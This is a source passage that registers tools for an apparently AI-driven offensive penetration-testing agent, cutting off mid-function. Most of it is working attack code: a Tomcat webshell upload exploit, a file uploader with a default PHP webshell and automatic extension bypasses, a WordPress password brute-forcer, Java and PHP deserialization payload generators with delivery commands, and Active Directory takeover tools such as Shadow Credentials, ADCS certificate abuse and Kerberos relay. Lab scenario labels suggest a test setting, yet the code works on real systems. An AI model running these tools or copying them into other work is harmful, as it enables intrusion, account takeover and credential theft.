    # ── S4U2Self/S4U2Proxy Constrained Delegation ─────────────────

    gateway.register_shell_tool(
        name="impacket_getST",
        command_template="python3 /home/kianabin/Darwin/venv/bin/getST.py -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
        description="S4U2Self/S4U2Proxy Constrained Delegation: request a service ticket on behalf of another user via Kerberos constrained delegation. Use when a service account has msDS-AllowedToDelegateTo configured. Target format: DOMAIN/USER:PASSWORD@DC_IP.",
        parameters={
            "spn": {"type": "string", "description": "Target service SPN (e.g. 'ldap/dc01.domain.local', 'cifs/dc01.domain.local')"},
            "target_user": {"type": "string", "description": "User to impersonate (e.g. 'Administrator')"},
            "target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP for authentication"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── Tomcat Exploitation ────────────────────────────────────────

    gateway.register_shell_tool(
        name="tomcat_exploit",
        command_template=(
            "python3 -c \""
            "import requests, base64\n"
            "b64 = '{payload_b64}'.encode()\n"
            "data = base64.b64decode(b64)\n"
            "files = {{'file': ('{filename}', data)}}\n"
            "try:\n"
            "    r = requests.{http_method}('{target_url}', files=files, timeout=30, verify=False)\n"
            "    print(f'Status: {{r.status_code}}')\n"
            "    print(r.text[:2000])\n"
            "except Exception as e:\n"
            "    print(f'Error: {{e}}')\n"
            "\" 2>&1",
        ),
        description="Tomcat exploitation: upload a malicious file (WAR/JSP) to Tomcat manager or upload endpoint. Use for CVE-2025-24813 (deserialization upload) or deploying webshells. Provide payload as base64-encoded content. Combine with send_payload for advanced payload construction.",
        parameters={
            "target_url": {"type": "string", "description": "Tomcat upload URL (e.g. 'http://host:8080/manager/html/upload')"},
            "payload_b64": {"type": "string", "description": "Base64-encoded payload content (WAR file or JSP shell)"},
            "filename": {"type": "string", "description": "Filename for upload (e.g. 'shell.war', 'exploit.jsp')"},
            "http_method": {"type": "string", "description": "HTTP method: PUT for CVE-2024-50379 race condition, POST for standard uploads"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── File Upload (multipart) ─────────────────────────────────────

    async def _file_upload(**kwargs) -> ToolResult:
        """Upload a file to a target URL via multipart POST (curl -F).

        Creates a temporary file from the provided content, uploads it
        to the target URL with the given field name, and returns the
        server response.  Use for unauthenticated file upload exploits
        (e.g. WordPress plugin upload endpoints, PHP webshell delivery).

        Uses subprocess_exec (argument list, no shell) — all user-supplied
        values are passed as individual argv entries, eliminating shell
        injection risk.
        """
        import tempfile as _tmp, os as _os

        url = (kwargs.get("url") or "").strip()
        field = kwargs.get("field", "file")
        filename = kwargs.get("filename", "payload.php")
        content = kwargs.get("content", '<?php system($_GET["cmd"]); ?>')
        timeout_s = max(5, int(kwargs.get("timeout", 30)))

        if not url or not url.startswith("http"):
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=f"Invalid URL: '{url}'", exit_code=1, elapsed_ms=0)

        # Parse extra fields
        extra = kwargs.get("extra_fields", {}) or {}
        if isinstance(extra, str):
            try:
                import json as _json
                extra = _json.loads(extra)
            except Exception:
                extra = {}

        tmp_path = ""
        try:
            # Write content to a temporary file
            with _tmp.NamedTemporaryFile(
                mode="w", suffix="_" + filename, delete=False,
            ) as _tf:
                _tf.write(content)
                tmp_path = _tf.name

            # Build argument list (no shell — safe against injection)
            cmd_args = [
                "curl", "-s", "-k", "-X", "POST",
                "-F", f"{field}=@{tmp_path};filename={filename}",
                "--connect-timeout", "10",
                "--max-time", str(timeout_s),
                "-w", "\n%{http_code}",
                url,
            ]
            for k, v in extra.items():
                cmd_args.extend(["-F", f"{k}={v}"])

            import time as _time
            _start = _time.perf_counter()
            proc = await asyncio.create_subprocess_exec(
                *cmd_args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout_s + 10,
            )
            stdout_s = stdout.decode("utf-8", errors="replace")
            stderr_s = stderr.decode("utf-8", errors="replace")
            _elapsed = (_time.perf_counter() - _start) * 1000

            # Parse HTTP status from curl -w output (last line)
            _http_status = 0
            _lines = stdout_s.strip().split("\n")
            if _lines:
                try:
                    _http_status = int(_lines[-1].strip())
                except ValueError:
                    pass
            _ok = (proc.returncode == 0
                   and _http_status not in (0, 400, 401, 403, 404, 405, 500, 502, 503))

            # ── Auto-retry with extension/Content-Type bypasses ──────
            # When the first upload fails (blocked extension or mime type),
            # try common bypass techniques automatically.
            _bypass_attempts = []
            if not _ok:
                _bypass_exts = [".php5", ".phtml", ".pht", ".phar", ".shtml",
                                ".php.jpg", ".php.png", ".inc", ".phps"]
                _bypass_types = ["application/x-httpd-php", "image/jpeg",
                                 "text/plain", "application/octet-stream"]
                # Try alternative extensions
                _orig_name = filename
                for _ext in _bypass_exts[:5]:
                    _alt_name = _orig_name.rsplit(".", 1)[0] + _ext
                    _bcmd = cmd_args[:]
                    # Replace the -F filename part
                    for _j, _arg in enumerate(_bcmd):
                        if _arg.startswith(f"{field}=@") and ";filename=" in _arg:
                            _bcmd[_j] = f"{field}=@{tmp_path};filename={_alt_name}"
                            break
                    try:
                        _bp = await asyncio.create_subprocess_exec(
                            *_bcmd, stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _bout, _berr = await asyncio.wait_for(
                            _bp.communicate(), timeout=15,
                        )
                        _bs = _bout.decode("utf-8", errors="replace")
                        _bl = _bs.strip().split("\n")
                        _bstatus = int(_bl[-1].strip()) if _bl and _bl[-1].strip().isdigit() else 0
                        if _bstatus in (200, 201, 202, 204, 301, 302):
                            _ok = True
                            stdout_s = _bs
                            stderr_s = _berr.decode("utf-8", errors="replace")
                            _http_status = _bstatus
                            stdout_s += f"\n[BYPASS] Extension bypass: {_alt_name} → HTTP {_bstatus}"
                            break
                    except Exception:
                        continue

            # ── Auto-retry with common extra_fields patterns ──────────
            # Many plugin upload endpoints require additional POST params
            # (IDs, directories, nonces).  When the first attempt fails
            # and no extra_fields were provided, try built-in patterns
            # automatically — no LLM round-trip needed.
            _auto_retries = []
            if not _ok and not extra:
                _auto_patterns = [
                    {"eeSFL_ID": "1",
                     "eeSFL_FileUploadDir": "/wp-content/uploads/"},
                    {"eeSFL_ID": "1",
                     "eeSFL_FileUploadDir": "/wp-content/uploads/simple-file-list/"},
                    {"action": "upload"},
                    {"upload": "1", "dir": "/"},
                ]
                for _ap in _auto_patterns:
                    _rcmd = cmd_args[:]
                    # Remove old -w and url, then re-add after extra fields
                    _rcmd.pop()  # url
                    _rcmd.pop()  # -w value
                    _rcmd.pop()  # -w
                    for _k, _v in _ap.items():
                        _rcmd.extend(["-F", f"{_k}={_v}"])
                    _rcmd.extend(["-w", "\n%{http_code}", url])
                    try:
                        _rp = await asyncio.create_subprocess_exec(
                            *_rcmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _rout, _rerr = await asyncio.wait_for(
                            _rp.communicate(), timeout=timeout_s + 10,
                        )
                        _rs = _rout.decode("utf-8", errors="replace")
                        _rl = _rs.strip().split("\n")
                        _rst = 0
                        if _rl:
                            try:
                                _rst = int(_rl[-1].strip())
                            except ValueError:
                                pass
                        _auto_retries.append((_rst, _rs, _ap))
                        if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
                            # Found a working pattern — stop trying more
                            break
                    except Exception:
                        pass

            if _auto_retries:
                _best = min(_auto_retries, key=lambda x: x[0] if x[0] >= 200 else 999)
                _rst, _rs, _ap = _best
                stdout_s += (
                    f"\n\n[AUTO-RETRY] Tried {len(_auto_retries)} extra_fields patterns. "
                    f"Best: {_ap} → HTTP {_rst}"
                )
                if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
                    _http_status = _rst
                    _ok = True

            return ToolResult(
                tool_name="file_upload", success=_ok,
                stdout=stdout_s, stderr=stderr_s,
                exit_code=_http_status or proc.returncode or 0,
                elapsed_ms=_elapsed,
            )

        except asyncio.TimeoutError:
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=f"Upload timed out after {timeout_s}s",
                exit_code=-1, elapsed_ms=timeout_s * 1000)
        except Exception as e:
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)
        finally:
            if tmp_path:
                try:
                    _os.unlink(tmp_path)
                except OSError:
                    pass

    gateway.register(
        name="file_upload",
        func=_file_upload,
        description="Upload a file via multipart POST (curl -F). Use for unauthenticated file upload exploits — WordPress plugin RCE, PHP webshell delivery, arbitrary file upload vulnerabilities. IMPORTANT: many plugin upload endpoints require additional POST parameters (IDs, directories, nonces). If you get HTTP 400/403/500, use extra_fields to add required form fields. Example: extra_fields={\"eeSFL_ID\":\"1\", \"eeSFL_FileUploadDir\":\"/wp-content/uploads/\"}",
        parameters={
            "url": {"type": "string", "description": "Upload endpoint URL (e.g. 'http://target/wp-content/plugins/x/ee-upload-engine.php')"},
            "field": {"type": "string", "description": "Form field name for the file (default: 'file')"},
            "filename": {"type": "string", "description": "Filename to upload (default: 'payload.php'). Use .php extension for PHP webshells."},
            "content": {"type": "string", "description": "File content to upload (default: simple PHP webshell '<?php system($_GET[\"cmd\"]); ?>')"},
            "timeout": {"type": "integer", "description": "Upload timeout in seconds (default: 30)"},
            "extra_fields": {"type": "object", "description": "Additional form fields as JSON object. REQUIRED for many plugins. Example: {\"eeSFL_ID\": \"1\", \"eeSFL_FileUploadDir\": \"/wp-content/uploads/\"} or {\"action\": \"upload\", \"nonce\": \"...\"}. Look for required POST params in plugin docs or error responses."},
        },
    )

    # ── WordPress Exploitation ──────────────────────────────────────

    async def _wpscan_enum(**kwargs) -> ToolResult:
        """Run wpscan with sensible defaults when no API token is available.

        Without an API token, wpscan cannot check for vulnerable plugins/themes
        (vp/vt flags), but it CAN still enumerate installed plugins, themes, and
        users.  This wrapper degrades the enum_mode automatically and omits the
        --api-token flag entirely when the token is empty.

        The token is read from: (1) the LLM-provided api_token parameter,
        (2) the WPSCAN_API_TOKEN env var, or (3) config/darwin.yaml → wpscan.api_token.

        When the daily API quota is exhausted, the tool automatically retries
        without the token so at least basic enumeration still works.
        """
        import os as _os

        target_url = kwargs.get("target_url", "")
        enum_mode = kwargs.get("enum_mode", "p,u")
        api_token = (kwargs.get("api_token") or "").strip()

        # Resolve token: LLM param → env var → darwin.yaml config
        if not api_token:
            api_token = _os.environ.get("WPSCAN_API_TOKEN", "")
        if not api_token:
            try:
                import yaml as _yaml
                _config_path = Path(__file__).parent.parent.parent / "config" / "darwin.yaml"
                if _config_path.exists():
                    with open(_config_path) as _f:
                        _cfg = _yaml.safe_load(_f) or {}
                    api_token = (_cfg.get("wpscan", {}) or {}).get("api_token", "") or ""
            except Exception:
                pass

        has_token = bool(api_token and api_token.strip())

        # ── Core runner ──────────────────────────────────────────
        async def _run(use_token: bool) -> tuple[str, str, int, float]:
            mode = enum_mode
            parts = ["wpscan", "--url", target_url, "--no-banner"]
            if use_token:
                parts += ["--api-token", api_token]
                # Upgrade basic enumeration to vulnerability detection when token
                # is available.  LLM often passes p,t,u not knowing a token exists.
                _upgraded = []
                for _flag in mode.split(","):
                    _flag = _flag.strip()
                    if _flag == "p":
                        _flag = "vp"
                    elif _flag == "t":
                        _flag = "vt"
                    _upgraded.append(_flag)
                mode = ",".join(_upgraded)
            else:
                # Degrade vulnerability checks to basic enumeration (no token needed)
                mode = mode.replace("vp", "p").replace("vt", "t")
            parts += ["--enumerate", mode]
            cmd = " ".join(parts) + " 2>&1 | head -500"

            import time as _time
            _start = _time.perf_counter()
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _stdout, _stderr = await asyncio.wait_for(
                proc.communicate(), timeout=120,
            )
            _elapsed = (_time.perf_counter() - _start) * 1000
            return (
                _stdout.decode("utf-8", errors="replace"),
                _stderr.decode("utf-8", errors="replace"),
                proc.returncode or 0,
                _elapsed,
            )

        _API_LIMIT_PATTERNS = [
            "api limit has been reached",
            "api limit reached",
            "api request limit",
            "daily api limit",
            "you have reached your api",
            "exceeded the number of requests",
            "too many requests",
            "rate limit exceeded",
        ]

        # ── First run (with token if available) ─────────────────
        try:
            stdout_s, stderr_s, exit_code, elapsed = await _run(has_token)
        except asyncio.TimeoutError:
            return ToolResult(
                tool_name="wpscan_enum", success=False,
                stdout="", stderr="wpscan timed out after 120s",
                exit_code=-1, elapsed_ms=120000,
            )

        # Detect API quota exhaustion and retry without token
        if has_token:
            combined = (stdout_s + " " + stderr_s).lower()
            quota_hit = any(p in combined for p in _API_LIMIT_PATTERNS)

            # Also detect: token provided but no vulnerability data returned
            # (wpscan should report CVEs / vulnerability sections with a valid token)
            has_vuln_data = (
                "vulnerability" in combined
                or "cve-" in combined
                or "[critical]" in combined
            )

            if quota_hit or not has_vuln_data:
                if quota_hit:
                    degraded_note = (
                        "\n\n[WPSCAN] API quota exhausted — retried without token. "
                        "Basic enumeration results follow.\n"
                    )
                else:
                    degraded_note = (
                        "\n\n[WPSCAN] No vulnerability data returned (token may be "
                        "invalid or quota exhausted) — retried without token.\n"
                    )

                # Re-run without token (timeout → keep original output)
                try:
                    stdout_s2, stderr_s2, exit_code2, elapsed2 = await _run(False)
                    stdout_s = degraded_note + stdout_s2
                    stderr_s = stderr_s2
                    exit_code = exit_code2
                    elapsed += elapsed2
                except asyncio.TimeoutError:
                    stdout_s = degraded_note + "\n[WPSCAN] Retry timed out — original results above.\n"

        parsed = _parse_shell_output(stdout_s)
        return ToolResult(
            tool_name="wpscan_enum",
            success=exit_code == 0,
            stdout=stdout_s,
            stderr=stderr_s,
            exit_code=exit_code,
            elapsed_ms=elapsed,
            parsed_output=parsed,
        )

    gateway.register(
        name="wpscan_enum",
        func=_wpscan_enum,
        description="WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. If no API token is available, vulnerability checking (vp/vt) degrades to plugin/theme listing (p/t) automatically.",
        parameters={
            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
            "enum_mode": {"type": "string", "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'p' (all plugins), 't' (all themes), or combined e.g. 'p,u'"},
            "api_token": {"type": "string", "description": "WPScan API token (leave empty if not available — plugin/theme/user listing still works)"},
        },
    )

    gateway.register_shell_tool(
        name="wp_xmlrpc_brute",
        command_template=(
            "python3 -c \"\n"
            "import requests, sys\n"
            "url = '{target_url}/xmlrpc.php'\n"
            "users = '{users}'.split(',')\n"
            "passwords = '{passwords}'.split(',')\n"
            "for u in users:\n"
            "    for p in passwords:\n"
            "        xml = '''<?xml version=\\\\\\\"1.0\\\\\\\"?><methodCall><methodName>wp.getUsers</methodName>"
            "<params><param><value><string>'''+u+'''</string></value></param>"
            "<param><value><string>'''+p+'''</string></value></param></params></methodCall>'''\n"
            "        try:\n"
            "            r = requests.post(url, data=xml, timeout=10)\n"
            "            if r.status_code == 200 and 'faultCode' not in r.text:\n"
            "                print(f'SUCCESS: {{u}}:{{p}}')\n"
            "                print(r.text[:500])\n"
            "        except: pass\n"
            "\" 2>&1 | head -50",
        ),
        description="Brute-force WordPress credentials via xmlrpc.php using wp.getUsers method. Use when you have identified a WordPress site and need to test weak credentials. Provide comma-separated username and password lists.",
        parameters={
            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
            "users": {"type": "string", "description": "Comma-separated usernames (e.g. 'admin,editor')"},
            "passwords": {"type": "string", "description": "Comma-separated passwords (e.g. 'password,admin,123456')"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── Oracle TNS Poisoning ───────────────────────────────────────

    gateway.register_shell_tool(
        name="oracle_tns_poison",
        command_template=(
            "python3 -c \"\n"
            "import socket, struct\n"
            "host = '{target_host}'\n"
            "port = {tns_port}\n"
            "sid = '{sid}'\n"
            "desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT={{port}}))(CONNECT_DATA=(SID={{sid}})))'\n"
            "payload = desc.encode()\n"
            "pkt_len = len(payload) + 8\n"
            "header = struct.pack('>HH', pkt_len, 6) + b'\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'\n"
            "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "sock.settimeout(10)\n"
            "try:\n"
            "    sock.connect((host, port))\n"
            "    sock.send(header + payload)\n"
            "    resp = sock.recv(4096)\n"
            "    print(f'Sent TNS CONNECT packet to {{host}}:{{port}} for SID={{sid}}')\n"
            "    print(f'Response ({{len(resp)}} bytes): {{resp[:500]}}')\n"
            "    sock.close()\n"
            "except Exception as e:\n"
            "    print(f'TNS error: {{e}}')\n"
            "\" 2>&1 | head -50",
        ),
        description="Oracle TNS Poisoning: send a crafted TNS CONNECT packet to an Oracle listener. Used for SID enumeration and TNS protocol attacks (DB-03 Oracle TNS scenario). Use when Oracle listener is detected on port 1521.",
        parameters={
            "target_host": {"type": "string", "description": "Target Oracle DB host IP"},
            "tns_port": {"type": "integer", "description": "TNS listener port (default 1521)"},
            "sid": {"type": "string", "description": "Oracle SID to test (e.g. 'ORCL', 'XE', 'ORACLE')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── AD Advanced Tools (AD-18/19/20/21) ────────────────────────

    gateway.register_shell_tool(
        name="pywhisker",
        command_template="/home/kianabin/Darwin/venv/bin/pywhisker -d {domain} -u {user} -p '{password}' -t {target} --action add -D {target_user} 2>&1 | head -50",
        description="Shadow Credentials attack (AD-18): add KeyCredentialLink to a target user in Active Directory to take over the account. Uses PKINIT to authenticate with the added key. Requires an account with GenericWrite/GenericAll over the target user.",
        parameters={
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "user": {"type": "string", "description": "Attacker username with write privilege on target"},
            "password": {"type": "string", "description": "Attacker password"},
            "target": {"type": "string", "description": "Target user to take over (e.g. svc_shadow)"},
            "target_user": {"type": "string", "description": "Target user sAMAccountName for the shadow credential"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="gettgtpkinit",
        command_template="python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem {cert_pem} -key-pem {key_pem} {domain}/{target_user} {ccache_file} 2>&1",
        description="Get Kerberos TGT via PKINIT using a certificate and private key (from Shadow Credentials attack). Use after pywhisker to authenticate as the target user. Outputs a ccache file for use with impacket tools.",
        parameters={
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "target_user": {"type": "string", "description": "Target username to authenticate as"},
            "cert_pem": {"type": "string", "description": "Path to certificate PEM file", "default": "/tmp/cert.pem"},
            "key_pem": {"type": "string", "description": "Path to private key PEM file", "default": "/tmp/key.pem"},
            "ccache_file": {"type": "string", "description": "Output ccache file path", "default": "/tmp/user.ccache"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="getnthash",
        command_template="python3 /opt/PKINITtools/getnthash.py -key {asrep_key} {domain}/{target_user} 2>&1",
        description="Recover NT hash via PKINIT U2U (User-to-User) authentication. Use after gettgtpkinit — the AS-REP encryption key from the TGT can be used to recover the user's NT hash without DCSync.",
        parameters={
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "target_user": {"type": "string", "description": "Target username"},
            "asrep_key": {"type": "string", "description": "AS-REP encryption key from gettgtpkinit output"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    # ── ADCS Certificate Services attacks ──────────────────────────
    gateway.register_shell_tool(
        name="certipy_adcs",
        command_template="certipy find -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -vulnerable 2>&1 | head -100",
        description="Enumerate ADCS for vulnerable certificate templates (ESC1-ESC8). Use when domain enumeration discovers a CA server. ESC1: overly permissive enrollment agent. ESC2: template allows request without signature. ESC3: enrollment agent template without authorization. ESC4: vulnerable ACL on template. ESC6: CA Flag EDITF_ATTRIBUTESUBJECTALTNAME2. ESC8: NTLM relay to HTTP endpoint.",
        parameters={
            "user": {"type": "string", "description": "Domain username"},
            "password": {"type": "string", "description": "Domain password"},
            "dc_ip": {"type": "string", "description": "Domain controller IP"},
            "ca_server": {"type": "string", "description": "CA server hostname/IP (discovered via certipy find or ldapsearch)"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="certipy_req",
        command_template="certipy req -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -ca {ca_name} -template {template} -upn {alt_upn} -dns {alt_dns} 2>&1 | head -100",
        description="Request certificate from ADCS using vulnerable template (ESC1-3 exploitation). Outputs .pfx for PKINIT authentication.",
        parameters={
            "user": {"type": "string", "description": "Domain username"},
            "password": {"type": "string", "description": "Domain password"},
            "dc_ip": {"type": "string", "description": "Domain controller IP"},
            "ca_server": {"type": "string", "description": "CA server hostname/IP"},
            "ca_name": {"type": "string", "description": "CA name from certipy find"},
            "template": {"type": "string", "description": "Vulnerable template name"},
            "alt_upn": {"type": "string", "description": "Alternative UPN for impersonation (e.g. Administrator@domain.local)"},
            "alt_dns": {"type": "string", "description": "Alternative DNS hostname"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="bloodyad_dacl",
        command_template="python3 /opt/bloodyAD/bloodyAD.py -d {domain} -u {user} -p '{password}' --host {target} {action} {target_object} {extra} 2>&1  | head -80",
        description="AD DACL abuse via bloodyAD (AD-19, AD-20). Supports: set owner (WriteOwner), add GenericAll (ForceChangePassword), shadow credentials add, and other DACL modifications. Use when you have an account with write privileges over a target object but no direct control.",
        parameters={
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "user": {"type": "string", "description": "Attacker username"},
            "password": {"type": "string", "description": "Attacker password"},
            "target": {"type": "string", "description": "Domain Controller hostname or IP"},
            "action": {"type": "string", "description": "Action: set owner, add GenericAll, add groupMember, set password, shadowCredentials"},
            "target_object": {"type": "string", "description": "Target DN or sAMAccountName to modify"},
            "extra": {"type": "string", "description": "Extra arguments (e.g. new owner DN for set owner)", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="krbrelayx",
        command_template="timeout 60 python3 /opt/krbrelayx/krbrelayx.py -t {target} -p {port} {extra_args} 2>&1 | head -80",
        description="Kerberos Unconstrained Delegation relay attack (AD-21). Relays captured Kerberos TGTs from unconstrained delegation hosts to gain domain admin access. Requires a machine with unconstrained delegation or the ability to coerce authentication.",
        parameters={
            "target": {"type": "string", "description": "Target DNS hostname or IP to relay to"},
            "port": {"type": "string", "description": "Target port", "default": "445"},
            "extra_args": {"type": "string", "description": "Extra krbrelayx arguments", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── Java Deserialization Tool (WEB-01) ─────────────────────────

    async def ysoserial_generate(
        command: str = "cat /flag.txt",
        gadget: str = "auto",
        target_url: str = "",
    ) -> ToolResult:
        """Generate Java deserialization payload with auto gadget selection.

        Tries common ysoserial gadget chains in order: CommonsCollections6,
        CommonsBeanutils1, Groovy1, Jdk7u21, Spring1. Returns the first
        successfully generated payload. For use with Tomcat deserialization
        (WEB-01/CVE-2025-24813) and other Java deserialization endpoints.
        """
        import asyncio, time, os, json as _json

        start = time.perf_counter()
        results: list[dict] = []
        _gadgets = (
            ["CommonsCollections6", "CommonsBeanutils1", "Groovy1",
             "Jdk7u21", "Spring1", "CommonsCollections5", "CommonsCollections4",
             "CommonsCollections7", "URLDNS"]
            if gadget == "auto" else [gadget]
        )
        _jar_paths = [
            "/opt/ysoserial-all.jar",
            "/usr/share/ysoserial/ysoserial-all.jar",
            os.path.expanduser("~/tools/ysoserial-all.jar"),
        ]
        _jar = None
        for _jp in _jar_paths:
            if os.path.exists(_jp):
                _jar = _jp
                break

        if not _jar:
            elapsed = (time.perf_counter() - start) * 1000
            return ToolResult(
                tool_name="ysoserial_generate", success=False,
                stdout="", stderr="ysoserial-all.jar not found. Install from https://github.com/frohoff/ysoserial",
                exit_code=1, elapsed_ms=elapsed,
            )

        for _g in _gadgets[:6]:
            try:
                cmd = f"java -jar {_jar} {_g} '{command}' 2>&1 | head -500"
                proc = await asyncio.create_subprocess_shell(
                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                stdout_s = stdout.decode("utf-8", errors="replace")
                stderr_s = stderr.decode("utf-8", errors="replace")

                _success = proc.returncode == 0 and len(stdout_s) > 20
                results.append({
                    "gadget": _g,
                    "success": _success,
                    "payload_len": len(stdout_s),
                    "payload_preview": stdout_s[:200] if _success else "",
                    "error": stderr_s[:200] if not _success else "",
                })

                if _success:
                    # Also provide delivery guidance
                    _delivery = (
                        f"\n\n=== DELIVERY GUIDANCE ===\n"
                        f"Generated {_g} payload ({len(stdout_s)} bytes).\n"
                        f"1. Save payload to file: echo '<PAYLOAD>' > /tmp/payload.bin\n"
                        f"2. For Tomcat (CVE-2025-24813): PUT the payload as session file\n"
                        f"   curl -X PUT http://TARGET:8080/session -H 'Content-Type: application/octet-stream' --data-binary @/tmp/payload.bin\n"
                        f"3. Trigger deserialization by GETting the session\n"
                        f"4. For other deserialization: send as raw body with Content-Type: application/x-java-serialized-object"
                    )
                    elapsed = (time.perf_counter() - start) * 1000
                    return ToolResult(
                        tool_name="ysoserial_generate", success=True,
                        stdout=stdout_s[:500] + _delivery,
                        stderr=stderr_s, exit_code=0, elapsed_ms=elapsed,
                    )
            except Exception as e:
                results.append({"gadget": _g, "error": str(e)})

        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="ysoserial_generate", success=False,
            stdout=_json.dumps(results, indent=2),
            stderr="No gadget chain produced a valid payload",
            exit_code=1, elapsed_ms=elapsed,
        )

    gateway.register(
        name="ysoserial_generate",
        func=ysoserial_generate,
        description="Generate Java deserialization payload using ysoserial. AUTO mode tries CommonsCollections6→Beanutils1→Groovy→Jdk7u21→Spring1 in order. Returns the first valid payload with delivery guidance (Tomcat session PUT, raw body, etc.). For Java deserialization vulnerabilities: WEB-01 (Tomcat CVE-2025-24813), RMI, JMX, JNDI injection.",
        parameters={
            "command": {"type": "string", "description": "Command to execute on target (default: 'cat /flag.txt')"},
            "gadget": {"type": "string", "description": "Gadget chain name, or 'auto' for sequential trial (default: auto)"},
            "target_url": {"type": "string", "description": "Optional target URL for delivery guidance"},
        },
    )

    async def php_serialize_generate(
        class_name: str = "User",
        properties: str = "username:admin,is_admin:b:1",
        command: str = "",
    ) -> ToolResult:
        """Generate PHP serialized object payload for deserialization attacks.

        Constructs a PHP serialized object string from class name and properties.
        For use with PHP deserialization vulnerabilities (WEB-17 and similar) where
        an application calls unserialize() on user-supplied data.
        """
        import time, base64, json as _json

        start = time.perf_counter()

        # Parse properties: "name:value,is_admin:b:1,count:i:99"
        # Types: s:string (default), b:boolean, i:integer, d:float, a:array
        props_list = []
        for prop in properties.split(","):
            prop = prop.strip()
            if not prop:
                continue
            parts = prop.split(":", 2)
            key = parts[0]
            if len(parts) == 1:
                # String value
                props_list.append({"name": key, "type": "s", "value": ""})
            elif len(parts) == 2:
                # String value with content
                props_list.append({"name": key, "type": "s", "value": parts[1]})
            elif len(parts) == 3:
                # Typed value
                props_list.append({"name": key, "type": parts[1], "value": parts[2]})

        # Build serialized PHP object
        # Format: O:<class_name_len>:"<class_name>":<prop_count>:{<props>}
        props_serialized = ""
        for p in props_list:
            name = p["name"]
            typ = p["type"]
            val = str(p["value"])
            props_serialized += f's:{len(name)}:"{name}";'
            if typ == "b":
                props_serialized += f'b:{1 if val.lower() in ("1","true","yes") else 0};'
            elif typ == "i":
                props_serialized += f'i:{val};'
            elif typ == "d":
                props_serialized += f'd:{val};'
            else:  # string
                props_serialized += f's:{len(val)}:"{val}";'

        serialized = f'O:{len(class_name)}:"{class_name}":{len(props_list)}:{{{props_serialized}}}'

        # Common exploitation payloads
        _template = ""
        if command:
            _template = (
                f"\n\n=== EXPLOITATION PAYLOADS ===\n"
                f"1. Auth bypass (set is_admin=true):\n"
                f"   curl -X POST {{TARGET}} -d 'data={serialized}'\n"
                f"2. RCE via __destruct/__wakeup (if class calls system/exec):\n"
                f'   O:{len(class_name)}:"{class_name}":1:{{s:4:"cmd";s:{len(command)}:"{command}";}}\n'
                f"3. Base64-encoded (for JSON APIs):\n"
                f"   {base64.b64encode(serialized.encode()).decode()}\n"
                f"4. URL-encoded:\n"
                f"   {__import__('urllib.parse').quote(serialized)}"
            )

        elapsed = (time.perf_counter() - start) * 1000
        return ToolResult(
            tool_name="php_serialize_generate", success=True,
            stdout=f"Serialized PHP object:\n{serialized}\n\nBase64: {base64.b64encode(serialized.encode()).decode()}{_template}",
            stderr="", exit_code=0, elapsed_ms=elapsed,
        )

    gateway.register(
        name="php_serialize_generate",
        func=php_serialize_generate,
        description="Generate PHP serialized object payload for PHP deserialization attacks (WEB-17, auth bypass, RCE). Given class name and properties (format: 'key:value,key2:b:1,key3:i:99'), constructs a valid PHP serialized string. Supports types: s=string, b=bool, i=int, d=float. Use with send_payload or curl_get to deliver the payload.",
        parameters={
            "class_name": {"type": "string", "description": "PHP class name (e.g. User, Account, Session)"},
            "properties": {"type": "string", "description": "Comma-separated properties in format 'key:value' or 'key:type:value'. String default, b=bool, i=int. Example: 'username:admin,is_admin:b:1,role:s:admin'"},
            "command": {"type": "string", "description": "Optional RCE command if the target class has a command execution gadget (__destruct, __wakeup)"},
        },
    )

    # ── Object Store Client (S3-compatible / MinIO / custom APIs) ──

    async def object_store_get(
        endpoint_url: str,
        object_name: str = "",
        access_key: str = "",
        secret_key: str = "",
